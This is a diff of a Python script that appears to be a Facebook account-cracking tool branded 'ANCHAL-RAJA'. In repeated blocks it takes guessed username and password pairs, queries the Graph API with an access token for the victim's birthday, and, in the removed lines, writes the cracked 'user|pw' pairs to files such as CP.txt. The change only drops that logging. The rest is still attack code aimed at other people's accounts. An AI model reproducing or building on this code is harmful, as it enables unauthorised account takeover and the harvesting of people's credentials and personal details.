@@ -173,21 +173,13 @@ class __xxx__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('r\%s [ANCHAL-RAJA-2F] %s | %s ' % (U, user, pw))
-                        wrt = '%s|%s' % (user,pw)
-                        cp.append(wrt)
-                        open('CP.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
                         day   = ''
                         year  = ''
                     except:
-                        pass
-                    print('\r%s [ANCHAL-RAJA-2F] %s | %s ' % (U, user, pw))
-                    wrt = '%s|%s' % (user,pw)
-                    cp.append(wrt)
-                    open('ANCHAL-RAJA_CP.txt' , 'a').write('%s\n' % wrt)
+                        pass                    
                     break
                 else:
                     continue
@@ -354,10 +346,6 @@ class __xxxx__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('r\%s [ANCHAL-RAJA-2F] %s | %s ' % (U, user, pw))
-                        wrt = '%s|%s' % (user,pw)
-                        cp.append(wrt)
-                        open('CP.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
@@ -365,10 +353,6 @@ class __xxxx__:
                         year  = ''
                     except:
                         pass
-                    print('\r%s [ANCHAL-RAJA-2F] %s | %s ' % (U, user, pw))
-                    wrt = '%s|%s' % (user,pw)
-                    cp.append(wrt)
-                    open('ANCHAL-RAJA_CP.txt' , 'a').write('%s\n' % wrt)
                     break
                 else:
                     continue
@@ -511,10 +495,6 @@ class __xxxxx__:
                         cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                         month, day, year = cp_ttl.split('/')
                         month = bulan_ttl[month]
-                        print('r\%s [ANCHAL-RAJA-2F] %s | %s ' % (U, user, pw))
-                        wrt = '%s|%s' % (user,pw)
-                        cp.append(wrt)
-                        open('CP.txt' , 'a').write('%s\n' % wrt)
                         break
                     except (KeyError, IOError):
                         month = ''
@@ -522,10 +502,6 @@ class __xxxxx__:
                         year  = ''
                     except:
                         pass
-                    print('\r%s [ANCHAL-RAJA-2F] %s | %s ' % (U, user, pw))
-                    wrt = '%s|%s' % (user,pw)
-                    cp.append(wrt)
-                    open('ANCHAL-RAJA -CP.txt' , 'a').write('%s\n' % wrt)
                     break
                 else:
                     continue
